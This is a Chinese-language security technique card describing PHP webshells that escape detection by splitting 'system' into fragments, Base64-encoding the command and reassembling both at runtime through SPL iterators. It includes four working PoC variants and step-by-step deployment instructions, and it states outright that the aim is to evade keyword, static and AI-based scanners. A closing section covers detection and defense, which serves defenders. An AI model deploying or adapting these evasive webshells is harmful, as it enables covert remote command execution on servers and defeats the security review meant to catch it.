---
id: web-php-rce-iterator-webshell-split-reassemble
title: PHP 迭代器 WebShell 免杀：拆分函数名与命令并在运行时重组
type: scenario
domain: web
path: web/php/rce
technique: php-iterator-obfuscation-av-bypass
aliases:
- PHP 迭代器免杀
- 迭代器 WebShell
- 拆分函数名免杀
- SPL 迭代器绕过 AI 检测
- 运行时重组 payload
tags:
- php
- webshell
- av-bypass
- obfuscation
- spl
- iterator
- dynamic-call
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-04'
updated: '2026-11-05'
verification:
  verified_by: verifier-V10
  verified_at: '2026-11-05T00:25:43+08:00'
  notes: 已对照原文核对四类迭代器变体、拆分函数名与 Base64 命令、运行时可变函数调用；未验证点：未在本机实际执行 PoC，免杀效果依赖原文扫描器 white 截图
---

## 一句话结论

把危险函数名（如 `system`）拆成 `sys`/`tem`、把命令 Base64 编码后分散到数组或数据流中，用 PHP SPL 迭代器在运行时筛选、合并、解码，再通过可变函数 `($func)($arg)` 调用，文件中不会出现完整的危险函数名或命令，可绕过基于关键词/浅层静态/部分 AI 的检测。

## 原理

- 静态检测（含多数 AI 代码扫描）依赖敏感 token 与局部结构：文件里出现 `system`、`eval`、`whoami`、`($_GET` 等即命中。
- PHP 的 SPL 迭代器允许把“数据”和“控制逻辑”分离：函数名片段、命令片段可以以普通字符串/数组元素存在，遍历时才拼接。
- 可变函数语法 `($func)($arg)` 让最终调用的函数名来自运行时变量，静态分析无法在 token 层直接看到 sink。
- 四种实现分别利用不同迭代器特性：
  - `ArrayIterator` + 引用 `&$value`：第一遍遍历把占位符改成 `system`/`whoami`，第二遍取出并调用；
  - `NoRewindIterator`：一次性数据流，手动 `next()` 跳过已消费项，制造不可回溯的控制流；
  - `FilterIterator` + `AppendIterator` + `LimitIterator`：多数据源分散存放片段，过滤器筛选、合并、限量提取；
  - `CachingIterator` + 标记：用 `MARKER_*` 构建状态机，在标记区间内收集片段并解码命令。
- 共同点是“敏感语义只在运行时内存中出现”，落盘代码中只有普通字符串、数组和迭代器调用。

## 触发条件

- 目标 PHP 环境启用 SPL（默认启用）。
- 最终执行函数（`system`/`exec`/`shell_exec` 等）未被 `disable_functions` 禁用，或存在绕过。
- 文件可落地并被 Web 访问（上传、写入、包含等）。
- 检测以静态内容/关键词为主；运行时行为检测仍可能捕获子进程。

## 利用步骤

1. 选择要执行的函数与命令，把函数名拆成多个无害片段（如 `sys` + `tem`），命令做 Base64 编码（`whoami` → `d2hvYW1p`）。
2. 按变体选择迭代器组织数据：
   - 引用修改：占位符数组 + `ArrayIterator`，第一遍替换、第二遍提取；
   - 一次性流：`NoRewindIterator` + `next()` 手动消费；
   - 多源过滤：`FilterIterator` 筛选 + `AppendIterator` 合并 + `LimitIterator` 限量；
   - 状态机：`CachingIterator` + `MARKER_START/MIDDLE/END`。
3. 运行时拼接出函数名、解码出参数，`function_exists` 检查后 `($func)($arg)` 调用。
4. 落地为 `.php`，访问并观察命令回显。

## PoC

引用修改（ArrayIterator）最小形态：

```php
<?php
$data = ['item1' => 'normal', 'item2' => 'EVAL_PLACEHOLDER',
         'item3' => 'CMD_PLACEHOLDER', 'item4' => 'end'];
$it = new ArrayIterator($data);

foreach ($it as $k => &$v) {
    if ($v === 'EVAL_PLACEHOLDER') $v = 'system';
    elseif ($v === 'CMD_PLACEHOLDER') $v = 'whoami';
}

$func = ''; $arg = '';
foreach ($it as $v) {
    if ($v === 'system') $func = $v;
    elseif ($v === 'whoami') $arg = $v;
}
if ($func && $arg && function_exists($func)) ($func)($arg);
```

一次性流（NoRewindIterator）核心：

```php
$it = new NoRewindIterator(new ArrayIterator(
    ['prepare', 'sys', 'tem', 'execute', 'd2hvYW1p', 'cleanup']
));
$parts = []; $arg = '';
foreach ($it as $item) {
    if ($item === 'sys' || $item === 'tem') $parts[] = $item;
    elseif ($item === 'execute') {
        $it->next();
        if ($it->valid()) $arg = base64_decode($it->current());
    }
}
$func = implode('', $parts);
if ($func && $arg && function_exists($func)) ($func)($arg);
```

多源过滤（Filter/Append/Limit）核心：

```php
$s1 = new ArrayIterator(['header', 'sys', 'footer']);
$s2 = new ArrayIterator(['prefix', 'tem', 'suffix']);
$s3 = new ArrayIterator(['data', 'd2hvYW1p', 'end']);
$f1 = new FunctionFilter($s1);  // accept: current in ['sys','tem']
$f2 = new FunctionFilter($s2);
$argF = new ArgFilter($s3);     // accept: strpos(current,'d2hv')===0
$all = new AppendIterator(); $all->append($f1); $all->append($f2);
$func = ''; foreach (new LimitIterator($all, 0, 2) as $p) $func .= $p;
$arg = ''; foreach (new LimitIterator($argF, 0, 1) as $e) $arg = base64_decode($e);
if ($func && $arg && function_exists($func)) ($func)($arg);
```

状态机（CachingIterator）核心：

```php
$stream = ['start','MARKER_START','sys','tem','MARKER_MIDDLE',
           'next','d2hvYW1p','MARKER_END','finish'];
$it = new CachingIterator(new ArrayIterator($stream), CachingIterator::FULL_CACHE);
$parts = []; $arg = ''; $inFunc = false;
foreach ($it as $v) {
    if ($v === 'MARKER_START') { $inFunc = true; continue; }
    if ($v === 'MARKER_MIDDLE') { $inFunc = false; continue; }
    if ($inFunc && ($v === 'sys' || $v === 'tem')) $parts[] = $v;
    if ($it->hasNext() && $v === 'next') {
        $n = $it->getInnerIterator()->current();
        if ($n === 'd2hvYW1p') $arg = base64_decode($n);
    }
}
$func = implode('', $parts);
if ($func && $arg && function_exists($func)) ($func)($arg);
```

## 变体与关联

- 变体：函数名可按任意粒度拆分；命令可用 Base64/十六进制/ROT13；迭代器可换成 `Generator`、`RecursiveIteratorIterator`、`InfiniteIterator` 等；最终调用可用 `call_user_func`、`array_map` 等回调（见关联卡）。
- 关联：[[web-php-rce-webshell-string-not-dynamic-call-av-bypass]]（按位取反 + 可变变量免杀）；[[web-generic-file-upload-encrypted-webshell-av-bypass]]（加密流量免杀）。
- 边界：只规避静态/AI 内容检测，不规避运行时子进程监控；若 `disable_functions` 禁用执行函数，需要另找原语。

## 检测与防御

- 检测：不要只看明文关键字；对迭代器数据流做污点/常量折叠分析（追踪 `ArrayIterator`/`FilterIterator`/`AppendIterator`/`LimitIterator` 的 current 值到 `($var)(...)` 调用）；关注大量无意义数组、`base64_decode`、`function_exists` + 可变函数调用的组合；运行时监控 PHP 进程 `execve`。
- 防御：`disable_functions` 禁用 `system/exec/shell_exec/passthru/proc_open` 等；上传目录禁止 PHP 解析；部署支持脱混淆/AST/行为分析的检测；对 Web 目录新增 PHP 文件做完整性监控。
